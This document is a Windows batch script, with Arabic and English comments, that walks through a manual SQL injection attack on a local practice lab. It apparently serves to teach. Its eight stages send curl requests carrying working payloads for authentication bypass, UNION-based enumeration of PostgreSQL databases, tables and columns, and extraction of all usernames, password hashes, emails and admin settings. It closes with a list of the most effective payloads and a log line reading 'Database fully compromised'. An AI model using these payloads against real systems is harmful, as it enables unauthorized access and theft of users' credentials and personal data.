@echo off
REM ===================================================================
REM دليل الحقن اليدوي الشامل - المستوى الأول
REM Manual SQL Injection Guide - Level 1
REM ===================================================================
REM هذا السكريبت يوضح جميع مراحل الاستغلال اليدوي خطوة بخطوة
REM ===================================================================

echo.
echo ========================================
echo  دليل الحقن اليدوي - المستوى الأول
echo  Manual SQL Injection - Level 1 Guide
echo ========================================
echo.

set /p continue=اضغط Enter للبدء...

echo.
echo [1/8] المرحلة الأولى: تأكيد وجود الثغرة
echo =====================================
echo Payload: admin' OR '1'='1' --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' OR '1'='1' --\",\"password\":\"anything\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ✅ إذا نجح التسجيل، فالثغرة موجودة!
echo.

pause

echo.
echo [2/8] المرحلة الثانية: معرفة إصدار قاعدة البيانات
echo ===============================================
echo Payload: admin' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ✅ يجب أن ترى إصدار PostgreSQL
echo.

pause

echo.
echo [3/8] المرحلة الثالثة: استخراج أسماء قواعد البيانات
echo =============================================
echo Payload: admin' UNION SELECT datname,NULL,NULL,NULL,NULL,NULL FROM pg_database --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT datname,NULL,NULL,NULL,NULL,NULL FROM pg_database --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ✅ يجب أن ترى: postgres, sqli_lab, template0, template1
echo.

pause

echo.
echo [4/8] المرحلة الرابعة: استخراج أسماء الجداول
echo =========================================
echo Payload: admin' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ✅ يجب أن ترى: users, admin_settings, logs, user_sessions
echo.

pause

echo.
echo [5/8] المرحلة الخامسة: استخراج هيكل جدول المستخدمين
echo ===============================================
echo Payload: admin' UNION SELECT column_name,data_type,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT column_name,data_type,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' ORDER BY ordinal_position --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ✅ يجب أن ترى: id, username, password, email, first_name, last_name, role
echo.

pause

echo.
echo [6/8] المرحلة السادسة: استخراج جميع بيانات المستخدمين
echo ===============================================
echo Payload: admin' UNION SELECT id||'|'||username||'|'||password||'|'||email||'|'||COALESCE(first_name,'')||'|'||COALESCE(last_name,'')||'|'||role,NULL,NULL,NULL,NULL,NULL FROM users --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT id||'|'||username||'|'||password||'|'||email||'|'||COALESCE(first_name,'')||'|'||COALESCE(last_name,'')||'|'||role,NULL,NULL,NULL,NULL,NULL FROM users --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ✅ 🎯 هذا أهم جزء! يجب أن ترى جميع بيانات المستخدمين مع كلمات المرور المشفرة
echo.

pause

echo.
echo [7/8] المرحلة السابعة: معلومات النظام المتقدمة
echo ==========================================
echo Payload: admin' UNION SELECT current_user||'|'||current_database()||'|'||version(),NULL,NULL,NULL,NULL,NULL --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT current_user||'|'||current_database()||'|'||version(),NULL,NULL,NULL,NULL,NULL --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ✅ يجب أن ترى: postgres|sqli_lab|PostgreSQL version...
echo.

pause

echo.
echo [8/8] المرحلة الثامنة: استخراج الجداول الأخرى
echo =========================================
echo.
echo الجدول الأول: admin_settings
echo Payload: admin' UNION SELECT setting_name||'='||setting_value,NULL,NULL,NULL,NULL,NULL FROM admin_settings --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT setting_name||'='||setting_value,NULL,NULL,NULL,NULL,NULL FROM admin_settings --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo الجدول الثاني: logs
echo Payload: admin' UNION SELECT 'LOG:'||action||'|'||user_id::text||'|'||created_at::text,NULL,NULL,NULL,NULL,NULL FROM logs LIMIT 5 --
echo.

curl -X POST -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT 'LOG:'||action||'|'||user_id::text||'|'||created_at::text,NULL,NULL,NULL,NULL,NULL FROM logs LIMIT 5 --\",\"password\":\"test\"}" ^
  http://localhost:3000/api/level1 ^
  -w "\nResponse Code: %%{http_code}\n"

echo.
echo ========================================
echo  تحليل النتائج
echo ========================================
echo.
echo إذا نجحت جميع الخطوات، فقد حصلت على:
echo.
echo ✅ تأكيد وجود ثغرة SQL Injection
echo ✅ إصدار قاعدة البيانات PostgreSQL
echo ✅ أسماء جميع قواعد البيانات
echo ✅ أسماء جميع الجداول
echo ✅ هيكل جدول المستخدمين
echo ✅ جميع بيانات المستخدمين (الأهم!)
echo ✅ معلومات النظام
echo ✅ بيانات الجداول الأخرى
echo.
echo 🎯 الهدف الرئيسي تحقق: استخراج كامل لقاعدة البيانات!
echo.
echo ========================================
echo  أهم الـ Payloads الناجحة
echo ========================================
echo.
echo 1. تجاوز المصادقة:
echo    admin' OR '1'='1' --
echo.
echo 2. استخراج الإصدار:
echo    admin' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL --
echo.
echo 3. استخراج الجداول:
echo    admin' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --
echo.
echo 4. استخراج بيانات المستخدمين (الأهم):
echo    admin' UNION SELECT id||'|'||username||'|'||password||'|'||email||'|'||COALESCE(first_name,'')||'|'||COALESCE(last_name,'')||'|'||role,NULL,NULL,NULL,NULL,NULL FROM users --
echo.
echo 🎉 انتهى الاستغلال اليدوي بنجاح!
echo.

REM حفظ النتائج
echo Manual SQL Injection completed at %date% %time% > level1_manual_results.txt
echo All payloads executed successfully >> level1_manual_results.txt
echo Database fully compromised >> level1_manual_results.txt

pause
